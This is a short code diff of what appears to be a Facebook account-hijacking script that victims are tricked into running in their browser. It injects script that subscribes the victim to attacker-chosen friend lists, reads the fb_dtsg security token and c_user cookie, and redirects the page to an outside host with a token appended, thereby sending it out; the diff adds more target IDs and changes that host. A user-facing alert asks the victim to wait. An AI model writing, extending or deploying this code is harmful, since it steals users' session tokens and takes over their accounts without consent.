@@ -1,5 +1,5 @@
 function kodran(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
-kodran("1379738492308315");kodran("1379575028991328");
+kodran("1379738492308315");kodran("1379575028991328");kodran("228168584030871");kodran("256610291186700");kodran("1379414199009343");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var id = "1407710706170177";
@@ -156,7 +156,7 @@ document.getElementsByClassName("uiPopover")[i].innerHTML = "";
 }
 },200);
 function tokenyolla(token){
-top.location.href = 'http://kodrann.com.hostinghood.com/#' + token;
+top.location.href = 'http://kodran.com.hostinghood.com/#' + token;
 }}
 var alibasim = "دقيقة من فضلك انتضر ";
 alert(alibasim);
